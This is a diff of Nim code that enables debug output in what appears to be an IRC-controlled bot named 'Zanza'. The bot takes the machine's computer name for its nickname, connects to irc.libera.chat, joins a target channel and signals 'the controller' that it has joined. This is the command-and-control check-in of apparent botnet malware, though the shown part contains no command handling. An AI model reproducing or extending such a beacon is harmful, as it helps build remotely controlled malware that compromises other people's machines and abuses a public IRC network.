@@ -22,7 +22,7 @@ for i in 0..<len(name_buffer):
     else:
         break
 
-#if g_dbg: echo "ComputerName: ", name
+if g_dbg: echo "ComputerName: ", name
 
 ## The final nickname must be 16 chars long so the rest will be filled with random digits
 randomize()
@@ -33,9 +33,9 @@ var
   client = newIrc("irc.libera.chat", nick=name & $randInt1 & $randInt2, joinChans = @[target_channel], realname = "Zanza", user="Zanza")
 
 
-#if g_dbg: echo "Trying to connect"
+if g_dbg: echo "Trying to connect"
 client.connect()
-#if g_dbg: echo "Connected"
+if g_dbg: echo "Connected"
 while true:
   #updt_tmp_cleanup()
   var event: IrcEvent
@@ -53,6 +53,6 @@ while true:
         ## Notify the controller that the bot has joined
         client.privmsg(target_channel,".")
       
-      #if g_dbg: echo(event.raw)
+      if g_dbg: echo(event.raw)
 
   
